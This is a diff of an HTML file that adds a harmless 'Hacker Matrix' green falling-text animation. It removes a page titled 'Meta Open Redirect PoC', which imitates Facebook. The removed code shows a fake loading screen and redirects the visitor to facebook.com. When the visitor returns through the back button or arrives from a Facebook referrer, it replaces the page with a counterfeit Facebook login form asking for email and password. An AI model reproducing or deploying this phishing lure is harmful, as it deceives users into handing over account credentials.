@@ -1,152 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Meta Open Redirect PoC</title>
-<style>
+  <meta charset="UTF-8">
+  <title>Hacker Matrix</title>
+  <style>
     body {
-        margin: 0;
-        padding: 0;
-        background: #f0f2f5;
-        font-family: Arial, sans-serif;
+      margin: 0;
+      overflow: hidden;
+      background: black;
     }
-    /* شاشة الـ Loading */
-    .loading {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        color: #1877f2;
-        font-size: 18px;
-        height: 100vh;
+    canvas {
+      display: block;
     }
-    .dot {
-        width: 8px;
-        height: 8px;
-        background: #1877f2;
-        border-radius: 50%;
-        animation: blink 1.2s infinite ease-in-out;
-    }
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes blink {
-        0%, 80%, 100% { opacity: 0; }
-        40% { opacity: 1; }
-    }
-    /* ديزاين صفحة الفيس */
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background: white;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
-        width: 320px;
-    }
-    .logo {
-        text-align: center;
-        font-size: 36px;
-        color: #1877f2;
-        font-weight: bold;
-        margin-bottom: 20px;
-    }
-    input {
-        width: 100%;
-        padding: 12px;
-        margin: 6px 0;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        font-size: 14px;
-        box-sizing: border-box;
-    }
-    .login-btn {
-        width: 100%;
-        padding: 12px;
-        background: #1877f2;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        cursor: pointer;
-    }
-    .create-btn {
-        width: 100%;
-        padding: 12px;
-        background: #42b72a;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        margin-top: 10px;
-        cursor: pointer;
-    }
-</style>
-<script>
-function showFakeFacebook() {
-    document.body.innerHTML = `
-        <div class="container">
-            <div class="login-box">
-                <div class="logo">facebook</div>
-                <input type="text" placeholder="Email address or phone number">
-                <input type="password" placeholder="Password">
-                <button class="login-btn">Log in</button>
-                <button class="create-btn">Create new account</button>
-            </div>
-        </div>
-    `;
-}
-
-window.onload = function () {
-    // التحقق من نوع التنقل
-    let navType = (performance.getEntriesByType("navigation")[0] || {}).type;
-    
-    // التحقق من الـ referrer للتأكد من أننا جايين من Facebook
-    let isFromFacebook = document.referrer && document.referrer.includes('facebook.com');
-    
-    if (navType === "back_forward" || isFromFacebook) {
-        // لو جاي من Back أو Forward أو من Facebook → عرض الفيس المزيف مباشرة
-        showFakeFacebook();
-    } else if (!sessionStorage.getItem('redirected')) {
-        // أول مرة → Loading ثم Redirect
-        document.body.innerHTML = `
-            <div class="loading">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                Loading Facebook...
-            </div>
-        `;
-        sessionStorage.setItem('redirected', 'true');
-        setTimeout(function(){
-            window.location.href = "https://facebook.com/a";
-        }, 1500);
-    } else {
-        // أي مرة تانية → عرض الفيس المزيف
-        showFakeFacebook();
-    }
-};
-
-// إضافة event listener للـ popstate للتعامل مع الـ back button
-window.addEventListener('popstate', function(event) {
-    showFakeFacebook();
-});
-
-// إضافة event listener للـ pageshow للتعامل مع الـ back/forward cache
-window.addEventListener('pageshow', function(event) {
-    if (event.persisted) {
-        // الصفحة جاية من الـ cache (back/forward)
-        showFakeFacebook();
-    }
-});
-</script>
+  </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
+
+<script>
+  // Setup canvas
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  // Characters
+  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
+  const lettersArray = letters.split("");
+
+  const fontSize = 16;
+  const columns = canvas.width / fontSize;
+
+  // Array to store drops
+  const drops = [];
+  for (let x = 0; x < columns; x++) {
+    drops[x] = 1;
+  }
+
+  // Draw function
+  function draw() {
+    // Black BG with opacity to create trail
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#0F0"; // Green text
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      // First row special text
+      if (drops[i] === 1 && Math.random() < 0.01) {
+        ctx.fillText("Hello b0oda", i * fontSize, drops[i] * fontSize);
+      } else {
+        const text = lettersArray[Math.floor(Math.random() * lettersArray.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      }
+
+      // Move drop down or reset
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+
+  setInterval(draw, 33);
+</script>
 </body>
 </html>
-
